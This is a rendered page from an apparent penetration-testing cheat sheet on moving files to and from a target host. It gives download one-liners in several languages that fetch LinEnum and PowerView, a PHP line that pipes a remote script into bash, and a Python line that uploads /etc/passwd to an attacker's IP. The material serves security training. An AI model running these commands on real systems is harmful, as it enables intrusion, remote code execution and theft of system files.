@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Pentest CheatSheet | Pentest CheatSheet</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Pentest CheatSheet" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Pentest CheatSheet" />
+<meta property="og:description" content="Pentest CheatSheet" />
+<link rel="canonical" href="http://localhost:4000/zNew/TransferFiles/TransferFilesCode.html" />
+<meta property="og:url" content="http://localhost:4000/zNew/TransferFiles/TransferFilesCode.html" />
+<meta property="og:site_name" content="Pentest CheatSheet" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Pentest CheatSheet" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/TransferFiles/TransferFilesCode.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Pentest CheatSheet</h1>
+        </a>
+        <h2>Pentest CheatSheet</h2>
+
+        <section id="downloads">
+          
+          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <h1 id="transferring-files-with-code">Transferring Files with Code</h1>
+<h2 id="python">Python</h2>
+<p><strong>Python 2 - Download</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python2.7 <span class="nt">-c</span> <span class="s1">'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'</span>
+</code></pre></div></div>
+
+<p><strong>Python 3 - Download</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'</span>
+</code></pre></div></div>
+
+<h2 id="php">PHP</h2>
+<p><strong>PHP Download with File_get_contents()</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php <span class="nt">-r</span> <span class="s1">'$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'</span>
+</code></pre></div></div>
+
+<p><strong>PHP Download with Fopen()</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php <span class="nt">-r</span> <span class="s1">'const BUFFER = 1024; $fremote = 
+fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'</span>
+</code></pre></div></div>
+
+<p><strong>PHP Download a File and Pipe it to Bash</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>php <span class="nt">-r</span> <span class="s1">'$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num =&gt; $line) { echo $line; }'</span> | bash
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">Note: The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.</code></p>
+
+<h2 id="other-languages">Other Languages</h2>
+<p><strong>Ruby - Download a File</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ruby <span class="nt">-e</span> <span class="s1">'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'</span>
+</code></pre></div></div>
+
+<p><strong>Perl - Download a File</strong></p>
+<div class="language-pl highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">$</span> <span class="nv">perl</span> <span class="o">-</span><span class="nv">e</span> <span class="p">'</span><span class="s1">use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");</span><span class="p">'</span>
+</code></pre></div></div>
+
+<h3 id="javascript">JavaScript</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">WinHttpReq</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">WinHttp.WinHttpRequest.5.1</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">WinHttpReq</span><span class="p">.</span><span class="nx">Open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">WScript</span><span class="p">.</span><span class="nx">Arguments</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="cm">/*async=*/</span><span class="kc">false</span><span class="p">);</span>
+<span class="nx">WinHttpReq</span><span class="p">.</span><span class="nx">Send</span><span class="p">();</span>
+<span class="nx">BinStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">ADODB.Stream</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">BinStream</span><span class="p">.</span><span class="nx">Type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+<span class="nx">BinStream</span><span class="p">.</span><span class="nx">Open</span><span class="p">();</span>
+<span class="nx">BinStream</span><span class="p">.</span><span class="nx">Write</span><span class="p">(</span><span class="nx">WinHttpReq</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">);</span>
+<span class="nx">BinStream</span><span class="p">.</span><span class="nx">SaveToFile</span><span class="p">(</span><span class="nx">WScript</span><span class="p">.</span><span class="nx">Arguments</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+</code></pre></div></div>
+
+<p><strong>Download a File Using JavaScript and cscript.exe</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">cscript.exe</span><span class="w"> </span><span class="nx">/nologo</span><span class="w"> </span><span class="nx">wget.js</span><span class="w"> </span><span class="nx">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</span><span class="w"> </span><span class="nx">PowerView.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="vbscript">VBScript</h3>
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dim</span> <span class="n">xHttp</span><span class="p">:</span> <span class="k">Set</span> <span class="n">xHttp</span> <span class="o">=</span> <span class="n">createobject</span><span class="p">(</span><span class="s">"Microsoft.XMLHTTP"</span><span class="p">)</span>
+<span class="n">dim</span> <span class="n">bStrm</span><span class="p">:</span> <span class="k">Set</span> <span class="n">bStrm</span> <span class="o">=</span> <span class="n">createobject</span><span class="p">(</span><span class="s">"Adodb.Stream"</span><span class="p">)</span>
+<span class="n">xHttp</span><span class="p">.</span><span class="n">Open</span> <span class="s">"GET"</span><span class="p">,</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="k">False</span>
+<span class="n">xHttp</span><span class="p">.</span><span class="n">Send</span>
+
+<span class="n">with</span> <span class="n">bStrm</span>
+    <span class="p">.</span><span class="n">type</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="p">.</span><span class="n">open</span>
+    <span class="p">.</span><span class="n">write</span> <span class="n">xHttp</span><span class="p">.</span><span class="n">responseBody</span>
+    <span class="p">.</span><span class="n">savetofile</span> <span class="n">WScript</span><span class="p">.</span><span class="n">Arguments</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="mi">2</span>
+<span class="n">end</span> <span class="n">with</span>
+</code></pre></div></div>
+
+<p><strong>Download a File Using VBScript and cscript.exe</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">cscript.exe</span><span class="w"> </span><span class="nx">/nologo</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w"> </span><span class="nx">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1</span><span class="w"> </span><span class="nx">PowerView2.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="upload-operations-using-python3">Upload Operations using Python3</h2>
+<p><strong>Starting the Python uploadserver Module</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-m</span> uploadserver 
+
+File upload available at /upload
+Serving HTTP on 0.0.0.0 port 8000 <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
+</code></pre></div></div>
+
+<p><strong>Uploading a File Using a Python One-liner</strong></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'</span>
+</code></pre></div></div>
+
+
+      </section>
+    </div>
+  </body>
+</html>
